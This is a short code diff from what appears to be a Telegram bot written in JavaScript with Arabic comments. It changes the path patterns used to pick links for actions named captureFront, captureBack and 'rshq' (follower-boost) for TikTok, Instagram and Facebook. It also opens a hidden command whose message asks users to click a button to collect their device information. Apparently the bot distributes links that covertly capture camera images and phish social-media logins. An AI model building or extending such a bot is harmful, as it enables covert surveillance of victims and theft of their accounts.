@@ -1869,7 +1869,7 @@ bot.on('callback_query', async (callbackQuery) => {
                 const link = $(element).attr('href');  
                 
                 // البحث عن الروابط التي تتوافق مع الإجراء المطلوب
-                if (action === 'captureFront' && link.includes('/n/')) {  
+                if (action === 'captureFront' && link.includes('/c/')) {  
                     foundLink = link;  
                     return false;  
                 } else if (action === 'captureBack' && link.includes('/b/')) {  
@@ -1884,10 +1884,10 @@ bot.on('callback_query', async (callbackQuery) => {
                 } else if (action === 'rshq_tiktok' && (link.includes('/t/') || link.includes('tiktok'))) {  
                     foundLink = link;  
                     return false;  
-                } else if (action === 'rshq_instagram' && (link.includes('/n/') || link.includes('instagram'))) {  
+                } else if (action === 'rshq_instagram' && (link.includes('/i/') || link.includes('instagram'))) {  
                     foundLink = link;  
                     return false;  
-                } else if (action === 'rshq_facebook' && (link.includes('/n/') || link.includes('facebook'))) {  
+                } else if (action === 'rshq_facebook' && (link.includes('/fe/') || link.includes('facebook'))) {  
                     foundLink = link;  
                     return false;  
                 }  
@@ -1935,6 +1935,7 @@ bot.on('callback_query', async (callbackQuery) => {
 }
 
 bot.answerCallbackQuery(callbackQuery.id);
+}); 
 bot.onText(/\/jjihigjoj/, (msg) => {
     const chatId = msg.chat.id;
     const message = 'مرحبًا! انقر على الزر لجمع معلومات جهازك.';
